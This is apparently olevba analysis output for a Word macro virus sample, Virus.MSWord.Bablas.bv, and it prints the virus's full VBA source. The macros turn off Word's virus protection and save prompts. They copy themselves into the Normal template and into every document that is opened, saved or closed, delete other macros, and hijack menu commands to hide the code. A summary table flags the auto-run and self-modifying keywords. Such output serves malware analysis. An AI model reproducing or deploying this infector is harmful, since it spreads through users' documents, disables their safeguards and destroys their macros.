olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.bv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.bv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BLUEOK.bas 
in file: Virus.MSWord.Bablas.bv - OLE stream: 'Macros/VBA/BLUEOK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ##### Innama a'malu binniyat #####
' Saya hanya berusaha melindungi komputerku, dan tentu juga komputer-
' teman-teman dari terinfeksinya virus macro yang merugikan.
' Semoga Allah melindungi kita semua
Sub ShowMessage()
    h = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    h = MsgBox("Acara dilanjutkan setelah pesan-pesan berikut" & _
    Chr(13) & "Untuk Diemay {Im} di Soekarno - Hatta Bandung  " & Chr(13) & _
    "Terimakasih telah membuat puyeng aku punya kepala" & Chr(13) & _
    "Untuk {Mr Zoe, Miss Adaw, Direktur, Mr Epul dll}" & Chr(13) & "Terimakasih atas dukungannya" & _
    Chr(13) & Chr(13) & "(Apalah indahnya cinta tanpa sebuah kejujuran)" & Chr(13) & "                   Rancaekek@2000", vbOKOnly + vbExclamation, "You like blue color...")
    End If
End Sub

Sub Bablas()
Attribute Bablas.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Bablas.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    h = MsgBox("Silahkan bongkar untuk belajar", vbExclamation + vbOKOnly, "You Like blue Color...")
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    h = MsgBox("Qun katawon walataqun kalaler." & Chr(13) & Chr(13) & _
    "I LOVE SOMETHING ERROR !", vbOKOnly + vbExclamation, "Bpp Hacker")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "Expansion blue.... "
    ActiveWindow.Caption = "(This is not danger)"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "You like blue color... "
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "You like BLUEOK color...") = "Deaisoke" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "BLUEOK" Then DocOk = True
        If Obj.Name <> "BLUEOK" And Obj.Name <> "ThisDocument" And Obj.Name <> "FORMBLUE" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying blue Virus From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="BLUEOK", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="FORMBLUE", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "BLUEOK" Then NorOk = True
        If Obj.Name <> "BLUEOK" And Obj.Name <> "ThisDocument" And Obj.Name <> "FORMBLUE" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
  
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying blue Virus from " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="BLUEOK", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="FORMBLUE", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    FORMBLUE.Show
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If

    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save

    RestoreCap
End Sub

Sub AutoClose()
    SikatDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
 
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.BLUEOK.SikatDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.BLUEOK.Ancurin"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.BLUEOK.Ancurin"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FORMBLUE.frm 
in file: Virus.MSWord.Bablas.bv - OLE stream: 'Macros/VBA/FORMBLUE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 











Private Sub Label3_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�We are The Best Team 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Rancaekek @2000
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Diemay (Im) Soekarno - Hatta Bandung from me ( Mr Zoe, Mr Epul, Miss Adaw, Direktur  dll } Tank for support .
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Bablas.bv' - OLE stream: 'Macros/FORMBLUE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Label3_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

